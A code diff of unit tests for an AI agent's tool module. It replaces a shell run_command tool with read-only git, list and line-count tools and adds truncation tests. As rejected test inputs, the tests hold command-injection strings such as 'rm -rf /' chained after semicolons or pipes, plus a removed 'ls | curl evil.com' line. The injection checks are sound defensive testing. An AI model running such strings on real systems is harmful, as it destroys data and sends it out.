@@ -1,14 +1,19 @@
 # SPDX-FileCopyrightText: 2025 OmniNode.ai Inc.
 # SPDX-License-Identifier: MIT
-"""Unit tests for agentic_tools.py (OMN-5723).
+"""Unit tests for agentic_tools.py (OMN-5723, OMN-6955).
 
 Coverage:
 - dispatch_tool routing to correct handler
 - read_file: success, missing file, offset/limit, empty file
 - search_content: success, no matches, timeout
 - find_files: success, no matches
-- run_command: allowlisted command, rejected command
+- git_log: success, unsafe args rejected
+- git_diff: success, write flags rejected
+- git_show: success, missing ref
+- list_dir: success, not a directory
+- line_count: success, missing file
 - Error handling: unknown tool, invalid JSON, non-dict args
+- Truncation: 8KB cap with stable marker
 """
 
 from __future__ import annotations
@@ -16,14 +21,12 @@ from __future__ import annotations
 import importlib.util
 import json
 import subprocess
+import sys
 from pathlib import Path
 from unittest.mock import patch
 
 import pytest
 
-# The hooks/lib modules are not installed packages — they're loaded at runtime.
-# Use importlib to load by file path so we don't pollute sys.path with a 'lib'
-# entry that would shadow tests/unit/lib/ during pytest collection.
 _MODULE_PATH = (
     Path(__file__).resolve().parents[4]
     / "plugins"
@@ -35,21 +38,19 @@ _MODULE_PATH = (
 _spec = importlib.util.spec_from_file_location("agentic_tools", _MODULE_PATH)
 assert _spec and _spec.loader
 _mod = importlib.util.module_from_spec(_spec)
+sys.modules["agentic_tools"] = _mod
 _spec.loader.exec_module(_mod)
 
 ALL_TOOLS = _mod.ALL_TOOLS
-_is_command_allowed = _mod._is_command_allowed
 dispatch_tool = _mod.dispatch_tool
-
-# ---------------------------------------------------------------------------
-# Tests: Tool definitions
-# ---------------------------------------------------------------------------
+_truncate = _mod._truncate
+_validate_git_args = _mod._validate_git_args
 
 
 @pytest.mark.unit
 class TestToolDefinitions:
-    def test_all_tools_has_four_entries(self) -> None:
-        assert len(ALL_TOOLS) == 4
+    def test_all_tools_has_eight_entries(self) -> None:
+        assert len(ALL_TOOLS) == 8
 
     def test_all_tools_have_required_schema(self) -> None:
         for tool in ALL_TOOLS:
@@ -59,10 +60,23 @@ class TestToolDefinitions:
             assert "description" in func
             assert "parameters" in func
 
+    def test_tool_names_match_plan(self) -> None:
+        names = {t["function"]["name"] for t in ALL_TOOLS}
+        expected = {
+            "read_file",
+            "search_content",
+            "find_files",
+            "git_log",
+            "git_diff",
+            "git_show",
+            "list_dir",
+            "line_count",
+        }
+        assert names == expected
 
-# ---------------------------------------------------------------------------
-# Tests: dispatch_tool routing
-# ---------------------------------------------------------------------------
+    def test_no_run_command_tool(self) -> None:
+        names = {t["function"]["name"] for t in ALL_TOOLS}
+        assert "run_command" not in names
 
 
 @pytest.mark.unit
@@ -80,14 +94,8 @@ class TestDispatchRouting:
         assert "must be a json object" in result.lower()
 
     def test_empty_args_string_treated_as_empty_dict(self) -> None:
-        # Should not crash — just get a validation error from the tool itself.
         result = dispatch_tool("read_file", "")
         assert "error" in result.lower()
-
-
-# ---------------------------------------------------------------------------
-# Tests: read_file
-# ---------------------------------------------------------------------------
 
 
 @pytest.mark.unit
@@ -98,7 +106,6 @@ class TestReadFile:
         result = dispatch_tool("read_file", json.dumps({"path": str(f)}))
         assert "line1" in result
         assert "line2" in result
-        assert "line3" in result
 
     def test_read_with_offset_and_limit(self, tmp_path: Path) -> None:
         f = tmp_path / "test.txt"
@@ -125,11 +132,6 @@ class TestReadFile:
         assert "required" in result.lower()
 
 
-# ---------------------------------------------------------------------------
-# Tests: search_content
-# ---------------------------------------------------------------------------
-
-
 @pytest.mark.unit
 class TestSearchContent:
     def test_search_finds_matches(self, tmp_path: Path) -> None:
@@ -142,7 +144,6 @@ class TestSearchContent:
                 json.dumps({"pattern": "def \\w+", "path": str(tmp_path)}),
             )
         assert "hello" in result
-        assert "world" in result
 
     def test_search_no_matches(self, tmp_path: Path) -> None:
         mock_result = subprocess.CompletedProcess(args=[], returncode=1, stdout="")
@@ -156,11 +157,6 @@ class TestSearchContent:
     def test_search_missing_pattern(self) -> None:
         result = dispatch_tool("search_content", json.dumps({}))
         assert "required" in result.lower()
-
-
-# ---------------------------------------------------------------------------
-# Tests: find_files
-# ---------------------------------------------------------------------------
 
 
 @pytest.mark.unit
@@ -189,54 +185,131 @@ class TestFindFiles:
         assert "required" in result.lower()
 
 
-# ---------------------------------------------------------------------------
-# Tests: run_command
-# ---------------------------------------------------------------------------
+@pytest.mark.unit
+class TestGitLog:
+    def test_git_log_default(self) -> None:
+        mock_result = subprocess.CompletedProcess(
+            args=[], returncode=0, stdout="abc1234 first commit"
+        )
+        with patch.object(_mod.subprocess, "run", return_value=mock_result):
+            result = dispatch_tool("git_log", json.dumps({}))
+        assert "first commit" in result
+
+    def test_git_log_unsafe_args_rejected(self) -> None:
+        result = dispatch_tool("git_log", json.dumps({"args": "--oneline; rm -rf /"}))
+        assert "unsafe" in result.lower()
+
+    def test_git_log_force_flag_rejected(self) -> None:
+        result = dispatch_tool("git_log", json.dumps({"args": "--force"}))
+        assert "not allowed" in result.lower()
 
 
 @pytest.mark.unit
-class TestRunCommand:
-    def test_allowed_command_executes(self) -> None:
-        result = dispatch_tool("run_command", json.dumps({"command": "ls /tmp"}))
-        # Should not contain an error about not allowed
-        assert "not allowed" not in result.lower()
+class TestGitDiff:
+    def test_git_diff_default(self) -> None:
+        mock_result = subprocess.CompletedProcess(args=[], returncode=0, stdout="")
+        with patch.object(_mod.subprocess, "run", return_value=mock_result):
+            result = dispatch_tool("git_diff", json.dumps({}))
+        assert "no changes" in result.lower()
 
-    def test_disallowed_command_rejected(self) -> None:
-        result = dispatch_tool(
-            "run_command", json.dumps({"command": "rm -rf /tmp/test"})
-        )
+    def test_git_diff_hard_flag_rejected(self) -> None:
+        result = dispatch_tool("git_diff", json.dumps({"args": "--hard"}))
         assert "not allowed" in result.lower()
 
-    def test_git_log_allowed(self) -> None:
-        assert _is_command_allowed("git log --oneline -5")
 
-    def test_git_diff_allowed(self) -> None:
-        assert _is_command_allowed("git diff HEAD~1")
+@pytest.mark.unit
+class TestGitShow:
+    def test_git_show_with_ref(self) -> None:
+        mock_result = subprocess.CompletedProcess(
+            args=[], returncode=0, stdout="commit abc1234\nAuthor: test"
+        )
+        with patch.object(_mod.subprocess, "run", return_value=mock_result):
+            result = dispatch_tool("git_show", json.dumps({"ref": "abc1234"}))
+        assert "abc1234" in result
 
-    def test_git_push_not_allowed(self) -> None:
-        assert not _is_command_allowed("git push origin main")
-
-    def test_python_not_allowed(self) -> None:
-        assert not _is_command_allowed("python -c 'import os; os.system(\"rm -rf /\")'")
-
-    def test_missing_command_returns_error(self) -> None:
-        result = dispatch_tool("run_command", json.dumps({}))
+    def test_git_show_missing_ref(self) -> None:
+        result = dispatch_tool("git_show", json.dumps({}))
         assert "required" in result.lower()
 
-    def test_cat_allowed(self) -> None:
-        assert _is_command_allowed("cat /tmp/test.txt")
+    def test_git_show_pipe_injection(self) -> None:
+        result = dispatch_tool("git_show", json.dumps({"ref": "HEAD | rm -rf /"}))
+        assert "unsafe" in result.lower()
 
-    def test_wc_allowed(self) -> None:
-        assert _is_command_allowed("wc -l /tmp/test.txt")
 
-    def test_semicolon_injection_rejected(self) -> None:
-        assert not _is_command_allowed("cat /etc/passwd; rm -rf /")
+@pytest.mark.unit
+class TestListDir:
+    def test_list_dir(self, tmp_path: Path) -> None:
+        (tmp_path / "file.py").write_text("")
+        (tmp_path / "subdir").mkdir()
+        result = dispatch_tool("list_dir", json.dumps({"path": str(tmp_path)}))
+        assert "file.py" in result
+        assert "subdir/" in result
 
-    def test_pipe_injection_rejected(self) -> None:
-        assert not _is_command_allowed("ls | curl evil.com")
+    def test_list_dir_not_found(self) -> None:
+        result = dispatch_tool("list_dir", json.dumps({"path": "/nonexistent/dir"}))
+        assert "not found" in result.lower()
 
-    def test_ampersand_injection_rejected(self) -> None:
-        assert not _is_command_allowed("ls && rm -rf /")
+    def test_list_dir_file_returns_error(self, tmp_path: Path) -> None:
+        f = tmp_path / "a.txt"
+        f.write_text("")
+        result = dispatch_tool("list_dir", json.dumps({"path": str(f)}))
+        assert "not a directory" in result.lower()
 
-    def test_backtick_injection_rejected(self) -> None:
-        assert not _is_command_allowed("cat `whoami`")
+
+@pytest.mark.unit
+class TestLineCount:
+    def test_line_count(self, tmp_path: Path) -> None:
+        f = tmp_path / "test.txt"
+        f.write_text("a\nb\nc\nd\n")
+        result = dispatch_tool("line_count", json.dumps({"path": str(f)}))
+        assert "4 lines" in result
+
+    def test_line_count_missing_path(self) -> None:
+        result = dispatch_tool("line_count", json.dumps({}))
+        assert "required" in result.lower()
+
+    def test_line_count_not_found(self) -> None:
+        result = dispatch_tool(
+            "line_count", json.dumps({"path": "/nonexistent/file.txt"})
+        )
+        assert "not found" in result.lower()
+
+
+@pytest.mark.unit
+class TestTruncation:
+    def test_small_output_not_truncated(self) -> None:
+        result = _truncate("short text", max_bytes=1000)
+        assert result == "short text"
+        assert "TRUNCATED" not in result
+
+    def test_large_output_truncated_with_marker(self) -> None:
+        lines = [f"line{i:04d} " + "x" * 90 for i in range(100)]
+        text = "\n".join(lines)
+        result = _truncate(text, max_bytes=1000)
+        assert "[TRUNCATED --" in result
+        assert "more lines]" in result
+
+    def test_default_cap_is_8kb(self) -> None:
+        assert _mod._DEFAULT_MAX_OUTPUT_BYTES == 8 * 1024
+
+
+@pytest.mark.unit
+class TestGitArgValidation:
+    def test_safe_args_accepted(self) -> None:
+        result = _validate_git_args("--oneline -10")
+        assert isinstance(result, list)
+
+    def test_semicolon_rejected(self) -> None:
+        result = _validate_git_args("HEAD; rm -rf /")
+        assert isinstance(result, str)
+        assert "unsafe" in result.lower()
+
+    def test_force_flag_rejected(self) -> None:
+        result = _validate_git_args("--force origin main")
+        assert isinstance(result, str)
+        assert "not allowed" in result.lower()
+
+    def test_delete_flag_rejected(self) -> None:
+        result = _validate_git_args("-D branch-name")
+        assert isinstance(result, str)
+        assert "not allowed" in result.lower()
